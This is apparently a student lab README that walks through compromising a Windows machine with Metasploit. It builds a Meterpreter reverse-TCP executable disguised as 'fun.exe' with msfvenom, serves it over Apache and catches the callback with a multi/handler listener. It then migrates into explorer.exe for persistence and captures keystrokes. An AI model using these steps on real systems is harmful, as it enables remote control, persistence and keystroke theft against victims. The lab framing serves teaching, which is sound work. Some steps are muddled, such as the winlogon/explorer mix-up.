# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## OUTPUT :
![Screenshot 2025-04-26 135930](https://github.com/user-attachments/assets/95449f05-771c-482a-98df-11a3f1b9cca8)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT :
![Screenshot 2025-04-26 135937](https://github.com/user-attachments/assets/e1e92ed4-6789-4a5c-98e8-3d8be31a3b04)

copy the fun.exe into the apache /var/www/html folder sudo systemctl apache2 start
Check the status of apache2
## OUTPUT :
![Screenshot 2025-04-26 135942](https://github.com/user-attachments/assets/fdc39444-5ef5-4369-b760-fdc1f511137e)

Invoke msfconsole:
## OUTPUT:
![Screenshot 2025-04-26 135948](https://github.com/user-attachments/assets/3dd7cd86-c33f-42fa-9deb-48cffb6f3c69)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT :
![Screenshot 2025-04-26 135953](https://github.com/user-attachments/assets/63cf8580-3f97-4bd1-ac3c-a037f8d8c928)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
## OUPUT :
![Screenshot 2025-04-26 135958](https://github.com/user-attachments/assets/f776795a-1b66-4f80-9acf-5a5646048746)

WINDOWS :
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads
## BROWSE OUTPUT:
![Screenshot 2025-04-26 140006](https://github.com/user-attachments/assets/34677129-21fb-485a-ac21-42a4298956d9)

## DOWNLOAD OUTPUT:
![Screenshot 2025-04-26 140014](https://github.com/user-attachments/assets/f4a3cb04-6660-4208-95e0-2aaa18023578)

## COME BACK TO PARROT:
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
## OUTPUT :
![Screenshot 2025-04-26 140020](https://github.com/user-attachments/assets/3e1a6d10-1919-4b79-8c49-ef020b6652f8)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
## OUTPUT :
![Screenshot 2025-04-26 140027](https://github.com/user-attachments/assets/5dbde45d-0565-48ae-81a1-2a3ccba8232e)


## WINDOWS OUTPUT :
![Screenshot 2025-04-26 140035](https://github.com/user-attachments/assets/ff956290-3044-4950-8bff-4c0e3b5f48f5)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
![Screenshot 2025-04-26 140035](https://github.com/user-attachments/assets/aff02c1e-fb07-43e0-b674-06a194817f4c)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


